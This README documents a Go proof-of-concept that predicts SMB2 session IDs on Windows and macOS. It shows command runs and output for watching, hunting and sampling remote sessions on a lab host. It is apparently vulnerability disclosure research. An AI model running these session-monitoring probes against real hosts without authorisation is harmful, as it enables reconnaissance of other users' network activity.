# SMB2 Predictable Session ID Demonstration

Microsoft Windows and Apple macOS use predictable Session IDs for SMB2 sessions. This code
demonstrates how to predict these IDs and determine some information about remote sessions.

Please see this blog post for more information:

- https://www.rumble.run/2020/03/smb2-session-prediction-consequences/

On Windows the Signature field of the returned SESSION_SETUP response is signed with the
original remote session key. This seems bad, but doesn't appear to be exploitable, as the
input to this key includes a client and server challenge (among other fields), that are
not visible as a remote third-party.

On newer macOS systems (10.15) the smbd Session ID increments by 1, which leaks session activity, but Session Bind requests fail and no information about the active sessions is obtained.

On Samba-based systems, the Session IDs are not predictable.

The predictable session IDs have been in place for years and seem to be a design choice.

The session binding and signature calculation process is well-documented:
 - Handle of session binding requests: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ed93f06-a1d2-4837-8954-fa8b833c2654
 - Signature calculation: https://docs.microsoft.com/en-us/archive/blogs/openspecification/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys


## Remote Session Monitoring

```
$ go run main.go 192.168.0.220 watch

2020/03/28 16:16:31 192.168.0.220: determining the session cycle for map[ntlmssp.DNSComputer:WIN-EM7GG1U0LV3 ntlmssp.DNSDomain:WIN-EM7GG1U0LV3 ntlmssp.NTLMRevision:15 ntlmssp.NegotiationFlags:0xe28a8215 ntlmssp.NetbiosComputer:WIN-EM7GG1U0LV3 ntlmssp.NetbiosDomain:WIN-EM7GG1U0LV3 ntlmssp.TargetName:WIN-EM7GG1U0LV3 ntlmssp.Timestamp:0x01d6054627286627 ntlmssp.Version:10.0.14393 smb.Capabilities:0x0000002f smb.CipherAlg:aes-128-gcm 
smb.Dialect:0x0311 smb.GUID:6edc815a-7bea-cb41-a1dd-6079352c4fce smb.HashAlg:sha512 smb.HashSaltLen:32 smb.SessionID:0x00002c328000002d smb.Signing:enabled smb.Status:0xc0000016]

2020/03/28 16:16:48 192.168.0.220: cycle found after 205 requests: fffffffffffffffc-fffffffffffffff0-fffffffff800004c-7ffffcc-ffffffffcc000030-33ffffd4-fffffffffffffff0-18-14-fffffffffc00001c-fffffffff8000014-bffffc4-4-fffffffff8000028-ffffffffd000001c-37ffffb4-1c-fffffffffc000034-ffffffffc3ffffa8-40000030-c-fffffffff8000008-7fffffc-ffffffd6cfffffd4-2930000038-ffffffffebffffd0-14000034-3ffff8c-8-4-ffffffff5c000038-a3ffffd4        

2020/03/28 16:16:48 192.168.0.220: watching for new sessions...
2020/03/28 16:16:54 192.168.0.220: SESSION 0x00002c329c000011 is EXPIRED 
2020/03/28 16:16:59 192.168.0.220: SESSION 0x00002c329c000031 is ACTIVE dialect:0x0311 sig:526ec3d5a65947888677c43fee02604f
2020/03/28 16:17:03 192.168.0.220: SESSION 0x00002c329c000049 is EXPIRED 
```

## Remote Session Hunting

```
$ go run main.go 192.168.0.220 hunt

2020/03/29 21:47:21 192.168.0.220: warning: hunt mode is unreliable and unlikely to find older sessions

2020/03/29 21:47:21 192.168.0.220: determining the session cycle for map[ntlmssp.DNSComputer:WIN-EM7GG1U0LV3 ntlmssp.DNSDomain:WIN-EM7GG1U0LV3 ntlmssp.NTLMRevision:15 ntlmssp.NegotiationFlags:0xe28a8215 ntlmssp.NetbiosComputer:WIN-EM7GG1U0LV3 ntlmssp.NetbiosDomain:WIN-EM7GG1U0LV3 ntlmssp.TargetName:WIN-EM7GG1U0LV3 ntlmssp.Timestamp:0x01d6063d88af7af5 ntlmssp.Version:10.0.14393 smb.Capabilities:0x0000002f smb.CipherAlg:aes-128-gcm 
smb.Dialect:0x0311 smb.GUID:6edc815a-7bea-cb41-a1dd-6079352c4fce smb.HashAlg:sha512 smb.HashSaltLen:32 smb.SessionID:0x00002c3880000069 smb.Signing:enabled smb.Status:0xc0000016]

2020/03/29 21:47:23 192.168.0.220: cycle found after 129 requests: ffffffffc8000014-37ffffe8-ffffffd6cfffffd8-2930000038-ffffffffebffffd0-14000034-3ffff8c-ffffffff5c000044-a3ffffc4-10-fffffffffffffff4-8-fffffffffffffff0-fffffffff800004c-7ffffcc-ffffffffcc000030-33ffffc4-10-1c-fffffffffc00001c-3ffffdc-fffffffff8000028-7ffffd4-fffffffffffffffc-1c-ffffffffffffffe0-fffffffffc000054-ffffffffc3ffffa8-34000048-bffffe8-fffffffff8000014-7fffffc
2020/03/29 21:47:23 192.168.0.220: hunting for existing sessions...
2020/03/29 21:47:25 192.168.0.220: sent 1000 requests (2c37e4000041)
```

## Remote Session ID Sampling

```
$ go run main.go 192.168.0.220 sample

2020/03/29 21:47:50 192.168.0.220: sample 100 session IDs for map[ntlmssp.DNSComputer:WIN-EM7GG1U0LV3 ntlmssp.DNSDomain:WIN-EM7GG1U0LV3 ntlmssp.NTLMRevision:15 ntlmssp.NegotiationFlags:0xe28a8215 ntlmssp.NetbiosComputer:WIN-EM7GG1U0LV3 ntlmssp.NetbiosDomain:WIN-EM7GG1U0LV3 ntlmssp.TargetName:WIN-EM7GG1U0LV3 ntlmssp.Timestamp:0x01d6063d9a0b8f3e ntlmssp.Version:10.0.14393 smb.Capabilities:0x0000002f smb.CipherAlg:aes-128-gcm smb.Dialect:0x0311 smb.GUID:6edc815a-7bea-cb41-a1dd-6079352c4fce smb.HashAlg:sha512 smb.HashSaltLen:32 smb.SessionID:0x00002c3898000061 smb.Signing:enabled smb.Status:0xc0000016]

2020/03/29 21:47:50 0x00002c3898000061
2020/03/29 21:47:50 0x00002c0f68000039
2020/03/29 21:47:50 0x00002c3898000071
2020/03/29 21:47:50 0x00002c3884000041
2020/03/29 21:47:50 0x00002c3898000075
2020/03/29 21:47:50 0x00002c389c000001
2020/03/29 21:47:50 0x00002c37f8000045
```